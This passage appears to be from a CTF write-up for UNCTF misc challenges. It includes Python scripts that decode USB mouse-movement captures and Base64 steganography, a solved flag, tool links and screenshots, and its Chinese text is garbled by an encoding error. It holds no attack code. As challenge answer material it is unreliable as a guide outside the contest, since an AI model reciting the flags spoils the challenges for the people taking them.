    keys = f.read().splitlines()

with open("LEFT.txt", "w") as left, open("RIGHT.txt", "w") as right, open("ALL.txt", "w") as all:
    posx, posy = 0, 0
    for line in keys:
        x = int(line[2:4], 16)
        y = int(line[5:7], 16)
        if x > 127:
            x -= 256
        if y > 115:
            y -= 256
        posx += x
        posy += y
        # 1 for left , 2 for right , 0 for nothing
        btn_flag = int(line[:2], 16)
        if btn_flag == 1:  # 1 ä»£è¡¨å·¦é”®ï¼Œ2ä»£è¡¨å³é”®
            left.write(f'{posx} {str(-posy)}' + '\n')
        elif btn_flag == 2:
            right.write(f'{posx} {str(-posy)}' + '\n')

        all.write(f'{posx} {str(-posy)}' + '\n')
```


![](./unctf_misc.assets/2022-11-21_00-00.png)

![](./unctf_misc.assets/2022-11-21_00-01.png)


![](./unctf_misc.assets/2022-11-21_00-05.png)

![](./unctf_misc.assets/2022-11-21_00-06.png)


`UNCTF{TOM_AND_JERRY_BEST_FRIENDS}`

### èŠéº»å¼€é—¨

https://github.com/livz/cloacked-pixel
https://github.com/RobinDavid/LSB-Steganography.git

[](https://3gstudent.github.io/éšå†™æŠ€å·§-PNGæ–‡ä»¶ä¸­çš„LSBéšå†™)

### è´æ–¯å®¶æ—çš„ä¾µç•¥

[Base64 éšå†™](https://www.tr0y.wang/2017/06/14/Base64steg/)


```python
def int2Bin(digit):
    return bin(digit)[2:] # å°†ç´¢å¼•è½¬æˆäºŒè¿›åˆ¶ï¼Œå»æ‰'0b';


def binAsc(string): # äºŒè¿›åˆ¶è½¬æˆASCIIç 
    temp = ''
    for i in range(int(len(string) / 8)):
        temp += chr(int(string[i * 8:i * 8 + 8], 2))
    return temp


def readBase64FromFile(filename):
    Base64Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" #Base64å­—ç¬¦é›† å·²æŒ‰ç…§è§„èŒƒæ’åˆ—
    result = ''
    with open(filename, 'r') as f:
        for data in f.readlines():
            if data.find('==') > 0:
                result += int2Bin(Base64Char.index(
                    data[-4]))[-4:] # æ ¹æ®éšå†™åŸç†ï¼Œâ€˜==â€™æƒ…å†µå–ç­‰å·å‰æœ€åä¸€ä¸ªå­—ç¬¦è½¬æ¢åå–å4ä½
            elif data.find('=') > 0:
                result += int2Bin(Base64Char.index(
                    data[-3]))[-2:] # æ ¹æ®éšå†™åŸç†ï¼Œâ€˜=â€™æƒ…å†µå–ç­‰å·å‰æœ€åä¸€ä¸ªå­—ç¬¦è½¬æ¢åå–å2ä½
    print(binAsc(result))

readBase64FromFile('flag')
```

## æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»


[éšæ³¢é€æµ](http://1o1o.xyz/bo_ctfcode.html)




![](./unctf_misc.assets/2022-11-23_09-02.png)
![](./unctf_misc.assets/2022-11-23_09-31.png)
![](./unctf_misc.assets/2022-11-23_09-40.png)
![](./unctf_misc.assets/2022-11-23_16-46.png)
![](./unctf_misc.assets/2022-11-23_22-58.png)
![](./unctf_misc.assets/2022-11-23_23-10.png)
![](./unctf_misc.assets/2022-11-23_23-23.png)
![](./unctf_misc.assets/2022-11-23_23-28.png)
![](./unctf_misc.assets/2022-11-24_00-31.png)
![](./unctf_misc.assets/2022-11-24_00-46.png)


